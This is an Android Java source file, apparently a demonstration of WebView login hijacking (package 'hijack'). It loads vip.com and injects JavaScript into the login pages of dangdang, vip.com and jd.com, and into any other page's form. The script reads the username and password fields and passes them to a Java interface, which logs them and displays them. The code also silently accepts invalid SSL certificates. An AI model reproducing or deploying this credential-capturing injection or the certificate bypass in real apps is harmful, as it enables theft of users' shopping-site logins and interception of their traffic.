package com.haoren.hijack;

import android.net.http.SslError;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

public class MyWebview extends ActionBarActivity{
	private WebView webView;
	
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.mywebview);
        
        
        webView = (WebView) findViewById(R.id.webView1);
		//开启js支持
		WebSettings settings = webView.getSettings();
		settings.setJavaScriptEnabled(true);
		webView.addJavascriptInterface(new MyJavaScriptInterface(), "MYOBJECT");
		webView.setWebViewClient(new WebViewClient(){
			@Override
			public boolean shouldOverrideUrlLoading(WebView view, String url) {
				view.loadUrl(url);
				Log.i("urls", "xu"+url);
				return true;
			}
			
			
			@Override
			public void onReceivedSslError(WebView view,
					SslErrorHandler handler, SslError error) {
				handler.proceed();//忽略错误证书
				//handler.cancel();
			}
			
			
			@Override
			public void onPageFinished(WebView view, String url) {
				super.onPageFinished(view, url);			
		        StringBuilder sb = new StringBuilder();
		        if(url.contains("vip.com")){
		        	sb.append("document.getElementById('J_topDownloadBar').style.display='none';");
		        }
		        if(url.contains("mpassport.dangdang.com")){
		        	sb.append("document.getElementById('password').onblur=function(){");
			        sb.append("var objPWD, objAccount;var str = 'dangdang';");
			        sb.append("objAccount = document.getElementById('username');");
			        sb.append("objPWD = document.getElementById('password');");
			        sb.append("if (objAccount != null) {str += objAccount.value;}");
			        sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
			        sb.append("window.MYOBJECT.processHTML(str);");
			        sb.append("return true;");
			        sb.append("};");
		        }else if(url.contains("mlogin.vip.com")){
		        	sb.append("document.getElementById('inputPsw').onblur=function(){");
			        sb.append("var objPWD, objAccount;var str = 'vip';");
			        sb.append("objAccount = document.getElementById('inputName');");
			        sb.append("objPWD = document.getElementById('inputPsw');");
			        sb.append("if (objAccount != null) {str += objAccount.value;}");
			        sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
			        sb.append("window.MYOBJECT.processHTML(str);");
			        sb.append("return true;");
			        sb.append("};");
		        }else if(url.contains("plogin.m.jd.com")){
		        	sb.append("document.getElementsByClassName('txt-input txt-password')[0].onblur=function(){");
			        sb.append("var objPWD, objAccount;var str = 'jd';");
			        sb.append("objAccount = document.getElementsByClassName('txt-input txt-username')[0];");
			        sb.append("objPWD = document.getElementsByClassName('txt-input txt-password')[0];");
			        sb.append("if (objAccount != null) {str += objAccount.value;}");
			        sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
			        sb.append("window.MYOBJECT.processHTML(str);");
			        sb.append("return true;");
			        sb.append("};");
		        }else{
			        sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
			        sb.append("var objPWD, objAccount;var str = 'other';");
			        sb.append("var inputs = document.getElementsByTagName('input');");
			        sb.append("for (var i = 0; i < inputs.length; i++) {");
			        sb.append("if (inputs[i].type.toLowerCase() === 'password') {objPWD = inputs[i];}");
			        sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
			        sb.append("}");
			        sb.append("if (objAccount != null) {str += objAccount.value;}");
			        sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
			        sb.append("window.MYOBJECT.processHTML(str);");
			        sb.append("return true;");
			        sb.append("};");   
		        }
		        view.loadUrl("javascript:" + sb.toString());
		    }
			
		});
		
		webView.loadUrl("http://m.vip.com");
		
	}
	
	class MyJavaScriptInterface
    {
        @JavascriptInterface
        public void processHTML(String html)
        {
            Log.i("webview", "xuu"+html);
            Toast.makeText(getApplicationContext(), html, Toast.LENGTH_LONG).show();
        }
    }
}
